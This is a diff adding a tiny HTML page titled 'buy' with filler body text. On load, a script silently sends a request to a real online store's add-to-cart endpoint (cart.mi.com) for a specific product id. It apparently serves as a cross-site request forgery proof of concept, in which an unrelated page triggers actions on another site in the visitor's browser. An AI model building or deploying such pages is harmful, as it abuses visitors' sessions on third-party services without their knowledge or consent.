@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>buy</title>
+</head>
+<body>
+	dsfa
+</body>
+<script>
+	var http = xhr();
+	http.open("get","http://cart.mi.com/cart/add/2152700002?jsonpcallback=jQuery11130995856573805213_1453949234208&_=1453949234209");
+	http.send(null);
+	function xhr() {
+		var xhr;
+		if(window.XMLHttpRequest){
+			xhr = new XMLHttpRequest();
+		}else{
+			xhr = new ActiveXObject("Microsoft.XMLHTTP");
+		}
+		return xhr;
+	}
+</script>
+</html>
